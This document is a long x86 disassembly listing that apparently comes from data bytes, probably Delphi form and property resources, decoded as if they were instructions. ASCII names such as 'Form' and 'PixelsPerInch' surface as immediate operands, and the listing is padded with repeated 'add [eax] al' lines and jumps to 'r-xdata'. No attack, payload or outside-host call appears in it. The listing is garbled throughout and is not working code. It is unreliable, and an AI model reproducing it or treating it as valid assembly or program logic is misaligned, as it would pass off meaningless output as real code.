add [ eax - 0x2fffbc24 ] dh
and [ ebp ] eax
pushad
loopne r-xdata
jae r-xdata
outsd
push esi
jb r-xdata
outsd
insb
nop
loopne r-xdata
inc ebp
add [ edi ] dl
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax ]
daa
inc ebp
add ah dh
daa
inc ebp
add [ eax ] bl
sub [ ebp ] al
lodsb [ esi ]
sub [ ebp ] al
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
loopne r-xdata
ror ah 0xf5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
test [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffc60044f6 ]
test [ eax + eax + 0x1c ] 0x2
add [ eax ] al
hlt
add [ ebx ] al
or al 0x54
inc edx
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsd
outsb
je r-xdata
inc ebx
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
outsd
insb
test [ eax + eax + 0x3 ] 0x6f465410
jb r-xdata
jb r-xdata
outsd
insb
int3
add [ ebx ] al
add [ eax ] al
add [ eax + edi * 8 + 0x620c0044 ] bl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
jb r-xdata
test [ eax + eax + 0x3 ] 0x6f42540c
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x9 ] bl
inc esp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
jb r-xdata
je r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x7afffc0 ]
add bh bh
insd
adc al 0x11
inc esp
add [ ebx ] al
lea eax [ eax ]
push eax
clc
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
add eax 0x58000000
inc eax
add ah ch
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
test [ eax + eax + 0xf ] 0x6544490d
jae r-xdata
lea eax [ eax ]
in al dx
test [ eax + eax + 0x6 ] 0x6f4e7362
outsb
or [ gs : edx + 0x73 ] ah
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x58000000 ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x30044f8 ] ah
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec eax
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
push cs
jo r-xdata
mov eax eax
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edi * 8 + 0x44 ] cl
add [ eax ] cl
jae r-xdata
insb
add [ gs : eax ] eax
push eax
outsd
jb r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x44f820c0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
imul edi [ edx + 0x65 ] 0x6c6f6f54
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc esi
outsd
outsd
imul ebx [ eax + 0x25 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov al [ 0x90044f9 ]
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax + 0x90044f9 ] ah
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shl al 0xf8
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ecx + edi * 8 ] al
inc esp
add [ edx ] cl
jo r-xdata
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
popad
dec ebp
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
outsb
insb
arpl [ edi + 0x6e ] bp
jae r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
movsb [ edi ] [ esi ]
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
stc
inc esp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x80044fa ] cl
insd
stc
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0xfa
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
inc eax
cli
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
clc
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
pushfd
popad
je r-xdata
inc esp
add [ esi ] al
or al 0x54
jns r-xdata
or edx [ ebx + eax * 2 + 0x6c ]
mov dl bh
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add ah dh
adc [ eax ] al
cmp al 0xfa
inc esp
add [ ebp - 0x533ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jns r-xdata
stc
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ edx + edi * 8 ] bh
inc esi
outsd
jb r-xdata
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
mov al [ 0x30044f8 ]
inc esi
outsd
jb r-xdata
lahf
inc ecx
add al cl
sub al [ ebp ]
xor ch 0x44
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x40fffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cld
inc esp
add [ eax + 0x44fe ] cl
add [ eax ] al
add cl [ eax ]
push es
inc ebp
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add [ eax + edi + 0x45 ] ah
add [ esp + ebx * 4 + 0x74040041 ] bh
inc ebp
add [ ecx + ebp ] bh
inc ebp
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax + 0x44 ]
xor eax 0x9080045
inc esp
add al bl
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add [ eax ] bh
inc ebp
add al bh
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x2c0043a2 ] ch
cmp [ ebp ] al
clc
inc ebp
add al ah
mov [ 0x38a40043 ] eax
inc ebp
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] bh
inc ebp
add [ eax + 0x3f ] cl
inc ebp
add al cl
fild [ ebx ]
or al 0x4c
inc ebp
add [ edi + ecx * 2 + 0x45 ] ch
add [ eax ] ch
dec esi
inc ebp
add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ eax + edx * 2 - 0x213bffbb ] ah
inc ebx
add [ ebx + ecx ] bh
inc esp
add [ eax + 0x7c004557 ] bl
sbb al 0x44
add [ eax - 0x53ffbbf9 ] bh
insb
inc ebp
add [ eax ] dh
and al [ ebp ]
loopne r-xdata
inc ebp
add [ eax + 0x33 ] ah
inc eax
add al ch
push eax
inc ebp
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah ah
sub al 0x45
add [ eax + 0x16 ] al
inc esp
add [ edx + esi + 0x45 ] dl
add [ eax ] ch
inc ebx
inc ecx
add [ esi + ebp + 0x2ee00045 ] ah
inc ebp
add ah ch
das
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
insd
outsd
add [ eax ] al
hlt
jae r-xdata
jae r-xdata
stc
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add ah al
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
call 0x504541f2
add al [ eax ]
add [ eax + edi * 8 ] bl
inc esp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add [ ebp + ebx * 2 + 0x2dc80045 ] cl
inc ebp
add [ esi + ebp + 0x45 ] al
add [ eax + esi * 2 + 0x2b000045 ] cl
inc ebp
add [ eax + 0x7000456b ] dl
push edx
inc ebp
add [ ebp + ebp * 2 + 0x45 ] al
add [ eax ] ch
cmp [ ebp ] al
push cs
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ esi ] al
std
inc esp
add [ esi - 0x2 ] dh
inc esp
add al bh
add al [ eax ]
add [ eax - 0x3bffbb0b ] al
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
jl r-xdata
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec esp
sti
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
add [ eax ] cl
cli
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45041d
cld
inc ebx
inc ebp
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ eax + 0x4f0e002e ] al
mov esi 0x2400041
add bh bh
rol [ ebx + 0x45 ] 0x0
aam 0x43
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add ah dl
inc ebx
insb
cmp al 0x10
inc eax
add [ eax + eax ] cl
[ ebx + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
inc esp
add [ eax + 0x2 ] ah
add bh bh
clc
inc esp
inc ebp
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
jb r-xdata
outsb
hlt
outsb
arpl [ eax + 0x6c ] bp
cwde
inc esp
add [ eax + eax ] bh
inc [ ebx ]
inc ebx
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
jmp edx
jo r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
inc eax
add [ edi + eax * 2 + 0x45 ] bh
add [ eax - 0x33ffbab9 ] cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
xchg ebp eax
inc esp
add [ eax + 0x2 ] cl
add bh bh
inc esp
inc ebp
inc ebp
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
nop
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
add al [ eax ]
jmp [ eax + 0x47 ]
stc
inc esp
add [ eax ] dh
insb
inc ebx
jb r-xdata
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
sbb [ edi + 0x45 ] al
add [ edi + eax * 2 ] ch
inc ebp
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
dec ecx
imul ebp [ ebp + 0x50 ] 0x80044f3
add al [ eax ]
dec eax
and eax [ ebp ]
int3
adc [ eax ] al
cdq
add [ eax ] al
[ esp - 0x5b9bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x43ffbac9 ]
retn
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
jne r-xdata
dec [ eax - 0x3300fffe ]
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ebp
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
sub eax [ edx ]
add bh bh
js r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
call 0xffffffffc0454adf
add [ eax ] al
inc eax
add [ eax ] al
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
dec [ eax ]
fwait
inc ebx
add [ eax + 0x4534 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc esp
add [ edx + eax ] cl
add bh bh
fsub [ ebx ]
inc ebp
add ah cl
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
enter 0x44fa 0x0
cwde
add al [ eax ]
[ eax - 0x3300fffe ]
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax + 0x2 ] bl
add bh bh
sbb al 0x45
inc ebp
add ah cl
inc ebx
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add al [ eax ]
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
push ecx
int3
jb r-xdata
push ecx
aam 0x13
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
mov eax 0x58004490
add al [ eax ]
[ eax * 2 + 0x43cc0045 ]
ja r-xdata
adc eax [ ecx ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
int3
test al 0x58
jb r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
aam 0x13
pop eax
pop esp
inc ebx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
jbe r-xdata
jns r-xdata
dec edi
outsb
inc esp
jb r-xdata
lodsb [ esi ]
pop ecx
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0xffffffffccff0002 ]
jo r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
aam 0x13
outsb
inc esp
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
int3
add al [ eax ]
dec esp
adc eax [ ecx ]
mov al [ 0xffffffffa0ff0002 ]
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
jpe r-xdata
adc eax [ ecx ]
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add bh bh
int3
imul esi [ ebp + 0x49 ] 0xd46f666e
adc eax [ ecx ]
mov al 0x2
add bh bh
mov al 0x2
add bh bh
int3
or al 0x4f
inc ebx
add al ch
add [ eax ] al
pop eax
outsb
outsw
aam 0x13
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
dec esp
jo r-xdata
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
add al [ eax ]
push [ eax - 0x3300fffe ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x5c ] bp
pop ebx
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
add [ eax ] al
or [ eax ] 0xa
dec edi
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
pop edx
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
add [ edx ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
in al 0x5d
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0042 ] al
dec edi
pop eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
dec esp
inc ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
outsb
dec eax
imul esp [ ebp + 0x48 ] 0xa80044fb
add al [ eax ]
[ eax + 0x1ff0002 ]
dec ebp
add [ esi ] al
dec edi
add [ eax ] al
add [ eax - 0x80000000 ] al
jbe r-xdata
dec edi
sub_450c4c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffbaf3 ] cl
or eax 0x2f80045
add [ eax ] al
movsb [ edi ] [ esi ]
sti
inc esp
add ah al
lahf
inc ecx
add al cl
sub al [ ebp ]
jl r-xdata
inc ebp
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add [ eax + edi + 0x45 ] ah
add [ esp + ebx * 4 + 0x74040041 ] bh
inc ebp
add ah bl
jne r-xdata
inc ebp
add [ eax + 0x33 ] ah
inc eax
add al ch
push eax
inc ebp
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah ah
sub al 0x45
add [ eax + 0x16 ] al
inc esp
add [ edx + esi + 0x45 ] dl
add [ eax ] ch
inc ebx
inc ecx
add [ eax + 0x77 ] cl
inc ebp
add al ah
inc ebp
add ah ch
das
movsb [ edi ] [ esi ]
cmp [ ebp ] al
jl r-xdata
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax + 0x44 ]
xor eax 0x9080045
inc esp
add al bl
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add [ eax ] bh
inc ebp
add al bh
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x2c0043a2 ] ch
cmp [ ebp ] al
clc
inc ebp
add al ah
mov [ 0x38a40043 ] eax
inc ebp
add [ esi + eax * 8 + 0x43 ] bh
ror [ ebx ] 0x1
inc esp
add [ ebp + esi + 0x45 ] al
add [ eax ] cl
or [ eax + eax - 0x28 ] eax
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] bh
inc ebp
add [ eax + 0x3f ] cl
inc ebp
add al cl
fild [ ebx ]
or al 0x4c
inc ebp
add [ edi + ecx * 2 + 0x45 ] ch
add [ eax ] ch
dec esi
inc ebp
